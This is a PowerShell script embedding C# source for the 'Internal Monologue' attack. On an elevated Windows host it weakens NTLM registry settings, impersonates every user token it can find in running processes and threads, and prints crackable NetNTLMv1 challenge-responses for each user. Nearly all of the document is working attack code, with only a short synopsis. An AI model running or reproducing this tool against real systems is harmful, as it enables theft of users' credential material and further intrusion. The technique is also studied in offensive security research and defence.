function Invoke-InternalMonolouge
{
<#
.SYNOPSIS
Retrieves NTLMv1 challenge-response for all available users

.DESCRIPTION
Downgrades to NTLMv1, impersonates all available users and retrieves a challenge-response for each.
	
Author: Elad Shamir (https://linkedin.com/in/eladshamir)

.EXAMPLE
Invoke-InternalMonolouge

.LINK
https://github.com/eladshamir/Internal-Monologue

#>

$Source = @"
using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;

namespace InternalMonologue
{
    public class Program
    {
        const int MAX_TOKEN_SIZE = 12288;

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,  
            string pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            int DesiredAccess,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            int TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            int dwDesiredAccess,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            int ImpersonationLevel,
            int dwTokenType,
            ref IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(
            IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle,
            IntPtr dwThreadId);

        private static void GetRegKey(string key, string name, out object result)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
            if (Lsa != null)
            {
                object value = Lsa.GetValue(name);
                if (value != null)
                {
                    result = value;
                    return;
                }
            }
            result = null;
        }

        private static void SetRegKey(string key, string name, object value)
        {
            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
            if (Lsa != null)
            {
                if (value == null)
                {
                    Lsa.DeleteValue(name);
                }
                else
                {
                    Lsa.SetValue(name, value);
                }
            }
        }

        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
        {
            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);

            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
        }

        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
        {
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
        }

        //Retrieves the SID of a given token
        public static string GetLogonId(IntPtr token)
        {
            int TokenInfLength = 0;
            // first call gets lenght of TokenInformation
            bool Result = GetTokenInformation(token, 2, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
            Result = GetTokenInformation(token, 2, TokenInformation, TokenInfLength, out TokenInfLength);

            if (!Result)
            {
                Marshal.FreeHGlobal(TokenInformation);
                return string.Empty;
            }

            string retVal = string.Empty;
            TOKEN_GROUPS groups = (TOKEN_GROUPS)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_GROUPS));
            int sidAndAttrSize = Marshal.SizeOf(new SID_AND_ATTRIBUTES());
            for (int i = 0; i < groups.GroupCount; i++)
            {
                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
                    new IntPtr(TokenInformation.ToInt64() + i * sidAndAttrSize + IntPtr.Size), typeof(SID_AND_ATTRIBUTES));
                if ((sidAndAttributes.Attributes & 0xC0000000) == 0xC0000000)
                {
                    IntPtr pstr = IntPtr.Zero;
                    ConvertSidToStringSid(sidAndAttributes.Sid, out pstr);
                    retVal = Marshal.PtrToStringAuto(pstr);
                    LocalFree(pstr);
                    break;
                }
            }

            Marshal.FreeHGlobal(TokenInformation);
            return retVal;
        }

        public static void HandleProcess(Process process)
        {
            string SID = null;

            try
            {
                //Duplicate the token
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;

                if (OpenProcessToken(process.Handle, 0x0002, ref token))
                {
                    var sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);

                    DuplicateTokenEx(
                        token,
                        0x0002 | 0x0008,
                        ref sa,
                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        (int)1,
                        ref dupToken);

                    CloseHandle(token);

                    //Get the SID of the token
                    try
                    {
                        StringBuilder sb = new StringBuilder();
                        int TokenInfLength = 256;
                        IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                        Boolean Result = GetTokenInformation(dupToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                        if (Result)
                        {
                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                            IntPtr pstr = IntPtr.Zero;
                            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                            SID = Marshal.PtrToStringAuto(pstr);
                            LocalFree(pstr);
                        }

                        Marshal.FreeHGlobal(TokenInformation);
                    }
                    catch (Exception e)
                    {
                        CloseHandle(dupToken);
                    }
                }

                //Handle each available user only once
                if (SID != null && authenticatedUsers.Contains(SID) == false)
                {
                    try
                    {
                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                        {
                            string result = ByteArrayToString(InternalMonologueForCurrentUser());
                            //Ensure it is a valid response and not blank
                            if (result != null && result.Length > 0)
                            {
                                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":1122334455667788:" + result);
                                authenticatedUsers.Add(SID);
                            }
                        }
                    }
                    catch (Exception e)
                    { /*Does not need to do anything if it fails*/ }
                    finally
                    {
                        CloseHandle(dupToken);
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        public static void HandleThread(ProcessThread thread)
        {
            string SID = null;

            try
            {
                //Try to get thread handle
                var handle = OpenThread(0x0040, true, new IntPtr(thread.Id));

                //If failed, return
                if (handle == IntPtr.Zero)
                {
                    return;
                }

                //Duplicate thread token
                var token = IntPtr.Zero;
                var dupToken = IntPtr.Zero;
                if (OpenThreadToken(handle, 0x0002, true, ref token))
                {
                    var sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);

                    DuplicateTokenEx(
                        token,
                        0x0002 | 0x0008,
                        ref sa,
                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        (int)1,
                        ref dupToken);

                    CloseHandle(token);

                    try
                    {
                        //Get the SID of the token
                        StringBuilder sb = new StringBuilder();
                        int TokenInfLength = 256;
                        IntPtr TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                        Boolean Result = GetTokenInformation(dupToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
                        if (Result)
                        {
                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));

                            IntPtr pstr = IntPtr.Zero;
                            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
                            SID = Marshal.PtrToStringAuto(pstr);
                            LocalFree(pstr);
                        }

                        Marshal.FreeHGlobal(TokenInformation);
                    }
                    catch (Exception e)
                    {
                        CloseHandle(dupToken);
                        CloseHandle(handle);
                    }
                }

                //Handle each available user only once
                if (SID != null && authenticatedUsers.Contains(SID) == false)
                {
                    try
                    {
                        //Impersonate user
                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                        {
                            string result = ByteArrayToString(InternalMonologueForCurrentUser());
                            //Ensure there is a valid response and not a blank
                            if (result != null && result.Length > 0)
                            {
                                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":1122334455667788:" + result);
                                authenticatedUsers.Add(SID);
                            }
                        }
                    }
                    catch (Exception e)
                    { /*Does not need to do anything if it fails*/ }
                    finally
                    {
                        CloseHandle(dupToken);
                        CloseHandle(handle);
                    }
                }
            }
            catch (Exception)
            { /*Does not need to do anything if it fails*/ }
        }

        //Maintains a list of handled users
        static List<string> authenticatedUsers = new List<string>();

        public static void Main()
        {
            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
            if (IsElevated())
            {
                //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
                object oldValue_LMCompatibilityLevel;
                object oldValue_NtlmMinClientSec;
                object oldValue_RestrictSendingNTLMTraffic;
                ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);

                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
                    {
                        HandleProcess(process);
                        foreach(ProcessThread thread in process.Threads)
                        {
                            HandleThread(thread);
                        }
                    }
                }
                
                //Undo changes made in the Extended NetNTLM Downgrade
                NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
            }
            else
            {
                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
                Console.WriteLine("Not elevated");
                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":1122334455667788:" + ByteArrayToString(InternalMonologueForCurrentUser()));
            }           
        }

        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
        private static byte[] InternalMonologueForCurrentUser()
        {
            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE _hOutboundCred;
                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
            SECURITY_INTEGER ClientLifeTime;
                ClientLifeTime.LowPart = 0;
                ClientLifeTime.HighPart = 0;
            SECURITY_HANDLE _hClientContext;
            uint ContextAttributes = 0;

            // Acquire credentials handle for current user
            AcquireCredentialsHandle(
                WindowsIdentity.GetCurrent().Name,
                "NTLM",
                2,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref _hOutboundCred,
                ref ClientLifeTime
                );

            // Get a type-1 message from NTLM SSP
            InitializeSecurityContext(
                ref _hOutboundCred,
                IntPtr.Zero,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            ClientToken.Dispose();

            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            // Custom made type-2 message with the hard-coded challenge 0x1122334455667788
            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0, 0, 0, 0, 0, 0, 0 });
            InitializeSecurityContext(
                ref _hOutboundCred,
                ref _hClientContext,
                WindowsIdentity.GetCurrent().Name,
                0x00000800,
                0,
                0x10,
                ref ServerToken,
                0,
                out _hClientContext,
                out ClientToken,
                out ContextAttributes,
                out ClientLifeTime
                );
            byte[] result = ClientToken.GetSecBufferByteArray();

            ClientToken.Dispose();
            ServerToken.Dispose();

            //Extract the NetNTLM response from a type-3 message and return it
            return ParseNTResponse(result);
        }

        //This function parses the NetNTLM response from a type-3 message
        private static byte[] ParseNTResponse(byte[] message)
        {
            short nt_resp_len = Convert.ToInt16(message[20] + message[21] * 256);
            short nt_resp_off = Convert.ToInt16(message[24] + message[25] * 256);
            byte[] nt_resp = new byte[nt_resp_len];
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            return nt_resp;
        }

        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        private static bool IsElevated()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;

        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = 2;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, int bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

    struct SecBufferDesc : IDisposable
    {
        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = 0;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }

    struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
    };

    struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;

    };

    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }
}

"@

$inmem=New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
$inmem.GenerateInMemory=1
$inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Location))))

Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem 

[InternalMonologue.Program]::Main()

}